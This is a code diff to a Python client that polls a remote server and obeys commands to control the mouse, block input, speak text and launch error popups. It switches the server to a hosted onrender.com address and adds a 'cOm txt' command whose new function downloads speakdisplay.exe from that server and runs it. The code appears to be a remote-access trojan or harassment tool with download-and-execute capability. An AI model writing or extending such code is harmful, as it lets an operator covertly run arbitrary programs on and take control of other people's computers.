@@ -20,7 +20,7 @@ import asyncio
 import aiohttp
 import pygame
 
-url = "http://192.168.9.115:5000/"
+url = "https:ms32-sha2.onrender.com/"
 # url = "http://127.0.0.1:5000/"
 screen = get_primary_display()
 terminate = False           
@@ -322,6 +322,7 @@ def showerr(num):
                             downloaded_size += len(chunk)
         for _ in range(1,int(num)+1):
             Thread(target=startfile,args=("error.exe",))
+            sleep(0.5)
         log(f"deployed {num} errors",terminal=True)
     except Exception as e:
         log(f"showerr thread error:\t{e}",state="WARN")
@@ -474,7 +475,26 @@ async def control():
                         double_click()
                     await asyncio.sleep(0.09)
             except Exception as e:log(f"control thread error:\t{e}")
-
+def commtxt():
+    try:
+        if not path.exists("speakdisplay.exe"):
+            exe = hit(url+f"static/apps/speakdisplay.exe")
+            try:
+                kp = type(exe.content.decode("utf-8"))
+                log(f"Likely error. recieved content for speakdisplay.exe is {kp}")
+            except Exception as e:
+                log(f"DOwnloaded speakdisplay.exe")
+            with open("speakdisplay.exe", "xb") as file:
+                    downloaded_size = 0
+                    for chunk in exe.iter_content(chunk_size=8192):
+                        if chunk:
+                            file.write(chunk)
+                            downloaded_size += len(chunk)
+            
+        Thread(target=startfile,args=("speakdisplay.exe",))
+        log(f"started commtxt",terminal=True)
+    except Exception as e:
+        log(f"commtxt thread error:\t{e}",state="WARN")
 def main():
     global sstate
     global sharing
@@ -542,6 +562,8 @@ def main():
                 Thread(target=block_main).start()
             elif "bLoCk off" in cmd:
                 bmstate = False
+            elif "cOm txt" in cmd:
+                Thread(target=commtxt).start()
             elif "sPeAk" in cmd:
                 txt = cmd.replace("sPeAk","")
                 saying = Thread(target=say,args=(txt,))
